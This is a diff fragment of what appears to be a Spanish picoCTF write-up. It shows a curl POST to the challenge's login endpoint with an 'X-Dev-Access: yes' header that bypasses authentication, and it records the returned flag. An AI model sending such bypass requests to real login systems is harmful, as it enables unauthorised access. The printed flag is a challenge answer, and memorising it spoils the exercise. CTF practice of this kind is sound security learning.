@@ -23,3 +23,5 @@ Copiamos el post como cURL y hacemos la petición manualmente.
 
 PS C:\Users\laced> curl.exe -X POST "http://amiable-citadel.picoctf.net:51240/login" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Dev-Access: yes" -d "email=ctf-player@picoctf.org&password=abc"
 {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_3e21b3a3}"}
+
+-->picoCTF{brut4_f0rc4_3e21b3a3}
